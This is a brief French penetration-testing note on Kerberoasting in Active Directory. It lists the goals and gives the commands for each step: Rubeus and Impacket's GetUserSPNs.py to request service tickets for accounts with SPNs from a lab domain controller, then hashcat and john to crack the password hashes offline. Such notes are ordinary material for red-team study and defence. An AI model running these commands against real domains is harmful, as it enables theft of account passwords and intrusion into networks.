---
public: true # set to true to make the article publishable
---
## Sources

- https://dl.packetstormsecurity.net/papers/general/kerberoasting.pdf

## Objectifs
- Obtenir une liste de compte utilisateurs disposant d'un SPN
- Collecter les TGS associés à ces SPNs (chiffrés en RC4)
- Tenter de cracker les mots de passe des comptes utilisateurs à partir des TGS récupérés (qui sont chiffrés avec les hash de comptes utilisateurs respectifs)

## Méthodologie
### Locale

#### Utiliser Rubeus.exe

Il réalise les opérations suivantes :
- découverte des SPNs
- Dump des TGS
- Obtention des Hashs
- 
./Rubeus.exe kerberoast /outfile:hash.txt


#### Cracker les hash :

hashcat -m 13100 --force -a 0 hash.txt dict.txt

### Distante

#### Impacket

##### Utiliser GetUserSPNs.py
 Il réalise les opérations suivantes :
- découverte des SPNs
- Dump des TGS
- Obtention des Hashs

```
./GetUserSPNs.py -request -dc-ip 192.168.1.105 ignite.local/yashika
```

##### Cracker les hash (bruteforce)
john --wordlist=/path/to/rockyou.txt hashes
